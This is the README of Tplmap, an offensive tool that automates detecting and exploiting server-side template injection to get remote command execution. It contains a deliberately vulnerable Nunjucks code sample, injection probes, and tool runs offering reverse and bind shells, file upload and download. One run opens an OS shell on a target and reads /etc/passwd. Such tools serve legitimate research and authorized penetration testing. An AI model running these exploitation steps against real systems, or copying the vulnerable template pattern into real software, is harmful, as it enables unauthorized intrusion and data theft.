Tplmap
======

Tplmap (short for _Template Mapper_) automates the detection and exploitation of Server-Side Template Injection (SSTI) vulnerabilities to break-out the sandbox and achieve remote command execution on the remote operating system. 

The tool can be used as a testbed to conduct researches on the SSTI vulnerability class and as offensive security tool in penetration test engagements.

The sandbox break-out techniques came from public [researches][4] as James Kett's [Server-Side Template Injection: RCE For The Modern Web App][1] and other original piece of [works][2] to [extend][3] this tool capabilities.

It achieves full compromise in rendered context, several code context and blind injection scenarios. It also exploits _eval()_-like injections in several languages and generic unsandboxed template engines.

Server-Side Template Injection
------------------------------

Assume that you are auditing a web application that uses user-provided values as template to generate a dynamic web page. This example in JavaScript uses [Nunjucks][5] template engine in an unsafe way.

```javascript
var connect = require('connect');
var http = require('http');
var url = require('url');
var nunjucks = require('nunjucks');

var app = connect();
app.use('/page', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);
    var name = url_parts.query.name;
    
    // SSTI VULNERABILITY
    // The user controllable `name` GET parameter 
    // is concatenated to the template string instead 
    // of being passed as `context` argument. 
    rendered = nunjucks.renderString(
      str = 'Hello ' + name + '!'
    );
    
    res.end(rendered);
  }
});
```

The page reflects the `name` parameter value, and discloses its SSTI nature when returns basic operation results computed at runtime.

```
$ curl -g 'http://www.target.com/page?name=John'
Hello John!
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

Exploitation
------------

Tplmap supports the detection and exploitation of SSTI to get access to the underlying file system and operating system.

```
$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.2
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Mako plugin is testing rendering with tag '${*}'
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
...
[+] Nunjucks plugin is testing rendering with tag '{{*}}'
[+] Nunjucks plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Nunjucks
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: yes 
   Bind and reverse shell: yes 
   File write: yes 
   File read: yes 
   Code evaluation: yes, javascript code

[+] Rerun tplmap providing one of the following options:

   --os-shell                 Run shell on the target
   --os-cmd                   Execute shell commands
   --bind-shell PORT          Connect to a shell bind to a target port
   --reverse-shell HOST PORT  Send a shell back to the attacker's port
   --upload LOCAL REMOTE      Upload files to the server
   --download REMOTE LOCAL    Download remote files
```

Use `--os-shell` option to compromise the target in a fully automated way.

```
$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.2
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Run commands on the operating system.

linux $ whoami
www
linux $ head /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

Supported template engines
--------------------------

Tplmap can exploit SSTI vulnerabilities in over 15 template engines, unsandboxed engines and generic _eval()_-like injections. Blind injections and injections in code contexts are supported.

| Template engine    | Remote Command Execution |  Blind | Code evaluation | File read | File write |
|----------------------|-------|-------------------|-----------------|-----------|------------|
| Mako                 | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Jinja2               | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Python (generic)     | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Nunjucks             | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Jade                 | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| doT                  | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Marko                | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| JavaScript (generic) | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Dust (<= dustjs-helpers@1.5.0) | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Smarty (unsecured)   | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| PHP (generic)        | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| Freemarker           | ✓ |  ✓                | ×               |  ✓        |  ✓         |
| Velocity             | ✓ |  ✓                | ×               |  ✓        |  ✓         |
| Twig                 | × | ×                 | ×               | ×         | ×          |
| Smarty (secured)     | × | ×                 | ×               | ×         | ×          |
| Dust (> dustjs-helpers@1.5.0)  | × | ×                 | ×               | ×         | ×          |

[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[2]: https://github.com/epinna/tplmap/issues/9
[3]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[4]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
[5]: https://mozilla.github.io/nunjucks/
